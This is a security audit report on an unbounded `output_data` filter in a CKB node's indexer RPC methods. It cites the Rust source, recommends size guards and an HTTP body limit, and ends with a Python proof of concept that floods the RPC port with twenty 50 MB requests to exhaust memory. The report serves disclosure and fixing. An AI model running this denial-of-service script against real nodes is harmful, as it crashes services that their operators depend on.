Audit Report

## Title
Unbounded `output_data` Filter Field Enables Memory-Exhaustion DoS — (`util/indexer/src/service.rs`, `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs`)

## Summary
The `IndexerSearchKeyFilter.output_data` field accepted by `get_cells`, `get_transactions`, and `get_cells_capacity` RPC methods has no size limit enforced at validation time. The regular indexer enforces `MAX_PREFIX_SEARCH_SIZE` (65535 bytes) on `script.args` but applies no equivalent guard to `output_data`. The HTTP RPC server applies no body-size limit. An unprivileged caller can submit requests carrying megabytes of attacker-controlled bytes in `output_data`, forcing the node to allocate and hold that memory for the full duration of a RocksDB or SQL scan, enabling sustained memory exhaustion and node crash.

## Finding Description

**Regular indexer — `util/indexer/src/service.rs`**

`MAX_PREFIX_SEARCH_SIZE` is defined at line 857 and enforced for `script.args` in two places:
- Lines 873–877: main search script args check.
- Lines 924–928: filter script args check.

The `output_data` branch at lines 943–948 performs no analogous check:

```rust
let output_data = filter.output_data.map(|data| {
    let mode = filter
        .output_data_filter_mode
        .unwrap_or(IndexerSearchMode::Prefix);
    (data.as_bytes().to_vec(), mode)   // ← unbounded allocation
});
```

The resulting `Vec<u8>` is held for the entire RocksDB scan and compared against every live cell's stored output data.

**Rich-indexer — `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs`**

The handler validates only `limit` (lines 25–34). At lines 199–218, `filter.output_data` is bound directly to the SQL query without any size check. In `Partial` mode on Postgres, `escape_and_wrap_for_postgres_like` further expands the attacker-supplied bytes before binding (line 211), amplifying the allocation.

**No HTTP body-size limit — `rpc/src/server.rs`**

The axum router at lines 119–129 applies `CorsLayer` and `TimeoutLayer` but no `DefaultBodyLimit`. The TCP server uses `LinesCodec::new_with_max_length(2 * 1024 * 1024)` (line 165), capping TCP at 2 MB, but the HTTP path has no equivalent cap. The `handle_jsonrpc` handler at lines 218–237 reads the full body as `Bytes` before any validation.

**Type definition — `util/jsonrpc-types/src/indexer.rs`**

`IndexerSearchKeyFilter.output_data` is typed as `Option<JsonBytes>` (line 138) with no size constraint at the type level.

## Impact Explanation

An unprivileged caller can send a single well-formed JSON-RPC request with a multi-megabyte `output_data` payload. The node allocates the full buffer on the heap and retains it for the duration of the cell scan. Sending 20 concurrent requests with 50 MB payloads each consumes ≥1 GB of heap, triggering OOM-kill or severe degradation of the node process. This directly matches the **High** impact class: "Vulnerabilities which could easily crash a CKB node."

## Likelihood Explanation

The RPC port is unauthenticated by default and commonly exposed to local networks or the public internet. No credentials, prior state, or privileged access are required. The attack requires only a single TCP connection and a well-formed JSON-RPC request. The missing check is a straightforward omission in the same function that already enforces the limit for `script.args`. Exploitation is deterministic and repeatable.

## Recommendation

Add a size guard for `output_data` in `util/indexer/src/service.rs` inside `TryInto<FilterOptions>`, immediately after the existing `script.args` check:

```rust
if let Some(ref data) = filter.output_data {
    if data.len() > MAX_PREFIX_SEARCH_SIZE {
        return Err(Error::invalid_params(format!(
            "search_key.filter.output_data len should be less than {MAX_PREFIX_SEARCH_SIZE}"
        )));
    }
}
```

Apply the same guard in `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs`, `get_transactions.rs`, and `get_cells_capacity.rs` before the SQL binding loop. Additionally, add axum's `DefaultBodyLimit` layer to the HTTP router in `rpc/src/server.rs` to enforce a global request body cap.

## Proof of Concept

```python
import json, socket

PAYLOAD = "0x" + "aa" * (50 * 1024 * 1024)  # 50 MB output_data

req = json.dumps({
    "id": 1, "jsonrpc": "2.0", "method": "get_cells",
    "params": [{
        "script": {
            "code_hash": "0x" + "00" * 32,
            "hash_type": "data",
            "args": "0x"
        },
        "script_type": "lock",
        "filter": {
            "output_data": PAYLOAD,
            "output_data_filter_mode": "partial"
        }
    }, "asc", "0x1", None]
}).encode()

sockets = []
for _ in range(20):
    s = socket.create_connection(("127.0.0.1", 8114))
    http = (
        f"POST / HTTP/1.1\r\nHost: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(req)}\r\n\r\n"
    ).encode() + req
    s.sendall(http)
    sockets.append(s)

input("Monitor node RSS — press Enter to release")
```

Each request causes the node to allocate ≥50 MB for the `output_data` buffer and hold it for the full cell scan. Twenty concurrent requests consume ≥1 GB, triggering OOM or severe degradation. The TCP path is separately limited to 2 MB by `LinesCodec` (line 165 of `rpc/src/server.rs`), but the HTTP path has no such cap, making it the viable attack vector. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** util/indexer/src/service.rs (L857-857)
```rust
const MAX_PREFIX_SEARCH_SIZE: usize = u16::MAX as usize;
```

**File:** util/indexer/src/service.rs (L873-877)
```rust
    if args_len > MAX_PREFIX_SEARCH_SIZE {
        return Err(Error::invalid_params(format!(
            "search_key.script.args len should be less than {MAX_PREFIX_SEARCH_SIZE}"
        )));
    }
```

**File:** util/indexer/src/service.rs (L922-928)
```rust
        let script_prefix = if let Some(script) = filter.script {
            let script: packed::Script = script.into();
            if script.args().len() > MAX_PREFIX_SEARCH_SIZE {
                return Err(Error::invalid_params(format!(
                    "search_key.filter.script.args len should be less than {MAX_PREFIX_SEARCH_SIZE}"
                )));
            }
```

**File:** util/indexer/src/service.rs (L943-948)
```rust
        let output_data = filter.output_data.map(|data| {
            let mode = filter
                .output_data_filter_mode
                .unwrap_or(IndexerSearchMode::Prefix);
            (data.as_bytes().to_vec(), mode)
        });
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs (L25-34)
```rust
        let limit = limit.value();
        if limit == 0 {
            return Err(Error::invalid_params("limit should be greater than 0"));
        }
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs (L199-218)
```rust
            if let Some(data) = &filter.output_data {
                match &filter.output_data_filter_mode {
                    Some(IndexerSearchMode::Prefix) | None => {
                        query = query
                            .bind(data.as_bytes())
                            .bind(get_binary_upper_boundary(data.as_bytes()));
                    }
                    Some(IndexerSearchMode::Exact) => {
                        query = query.bind(data.as_bytes());
                    }
                    Some(IndexerSearchMode::Partial) => match self.store.db_driver {
                        DBDriver::Postgres => {
                            let new_data = escape_and_wrap_for_postgres_like(data);
                            query = query.bind(new_data);
                        }
                        DBDriver::Sqlite => {
                            query = query.bind(data.as_bytes());
                        }
                    },
                }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** util/jsonrpc-types/src/indexer.rs (L132-147)
```rust
pub struct IndexerSearchKeyFilter {
    /// if search script type is lock, filter cells by type script prefix, and vice versa
    pub script: Option<Script>,
    /// filter cells by script len range
    pub script_len_range: Option<IndexerRange>,
    /// filter cells by output data
    pub output_data: Option<JsonBytes>,
    /// output data filter mode, optional default is `prefix`
    pub output_data_filter_mode: Option<IndexerSearchMode>,
    /// filter cells by output data len range
    pub output_data_len_range: Option<IndexerRange>,
    /// filter cells by output capacity range
    pub output_capacity_range: Option<IndexerRange>,
    /// filter cells by block number range
    pub block_range: Option<IndexerRange>,
}
```
